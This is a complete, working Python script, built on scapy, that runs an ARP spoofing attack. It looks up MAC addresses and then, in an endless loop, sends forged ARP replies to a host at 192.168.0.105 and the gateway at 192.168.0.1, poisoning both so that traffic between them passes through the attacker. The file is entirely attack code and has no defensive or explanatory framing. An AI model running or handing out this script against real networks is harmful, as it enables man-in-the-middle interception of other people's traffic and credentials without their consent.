#!/usr/local/env python

import scapy.all as scapy
import time

#scapy.ls(scapy.ARP)
#packet = scapy.ARP()

def get_mac(ip):
    arp_request           = scapy.ARP(pdst=ip)
    broadcast             = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list         = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose=False)

sent_packets_count = 0
while True:
    spoof("192.168.0.105","192.168.0.1")
    spoof("192.168.0.1","192.168.0.105")
    sent_packets_count += 2
    print("[+] Packets sent ==>> "+str(sent_packets_count))
    time.sleep(2)
